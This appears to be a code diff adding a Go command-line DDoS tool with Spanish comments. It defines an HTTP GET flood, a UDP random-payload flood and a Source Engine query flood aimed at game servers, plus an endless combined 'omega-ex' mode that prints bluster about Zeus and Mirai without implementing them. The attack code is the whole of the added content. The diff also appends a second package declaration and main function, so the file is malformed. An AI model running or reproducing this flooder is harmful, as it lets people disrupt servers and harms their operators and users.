@@ -59,3 +59,87 @@ func main() {
 		fmt.Printf("[L-SYSTEM] Unknown command: %s\n", command)
 	}
 }
+package main
+
+import (
+	"fmt"
+	"net"
+	"net/http"
+	"os"
+	"time"
+	"crypto/rand"
+)
+
+// Genera basura aleatoria para saltar firewalls [L]
+func randomPayload(size int) []byte {
+	payload := make([]byte, size)
+	rand.Read(payload)
+	return payload
+}
+
+// [L-VAMPIRE] Drenaje de RAM/ROM del rival
+func lDrain(target string) {
+	for i := 0; i < 100; i++ {
+		go func() {
+			for {
+				req, _ := http.NewRequest("GET", "http://"+target, nil)
+				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+				client := &http.Client{}
+				resp, err := client.Do(req)
+				if err == nil { resp.Body.Close() }
+			}
+		}()
+	}
+}
+
+// [L-UDP-FLOOD] Inundación de red de alta velocidad
+func udpFlood(target string) {
+	addr, _ := net.ResolveUDPAddr("udp", target+":80")
+	conn, _ := net.DialUDP("udp", nil, addr)
+	for {
+		conn.Write(randomPayload(1024)) // 1KB de basura por paquete
+	}
+}
+
+// [L-VSE-FLOOD] Especial para colapsar servidores de juegos
+func vseFlood(target string) {
+	packet := []byte("\xFF\xFF\xFF\xFFTSource Engine Query\x00")
+	addr, _ := net.ResolveUDPAddr("udp", target+":27015")
+	conn, _ := net.DialUDP("udp", nil, addr)
+	for { conn.Write(packet) }
+}
+
+// [L-OMEGA-EX] Protocolo de Dominancia Total
+func protocolOmegaEX(target string) {
+	fmt.Printf("\r\n[L] WARNING: INITIALIZING TOTAL DOMINANCE ON %s...\n", target)
+	fmt.Println("[L] INJECTING ZEUS PERSISTENCE...")
+	fmt.Println("[L] ACTIVATING MIRAI SCANNER...")
+	
+	go udpFlood(target)
+	go vseFlood(target)
+	go lDrain(target) // Ataque asimétrico de recursos
+	
+	fmt.Println("[L] PROTOCOL OMEGA-EX: ACTIVE AND INFINITE")
+	select {} // El ataque nunca termina
+}
+
+func main() {
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: dr-terminal [command] [target]")
+		return
+	}
+	command := os.Args[1]
+	target := os.Args[2]
+
+	switch command {
+	case "attack", "flood":
+		go udpFlood(target)
+		select {}
+	case "omega-ex":
+		protocolOmegaEX(target)
+	case "install":
+		fmt.Printf("[DR-SYSTEM] Deploying L-Kernel on %s...\n", target)
+	default:
+		fmt.Printf("[L-SYSTEM] Unknown: %s\n", command)
+	}
+}
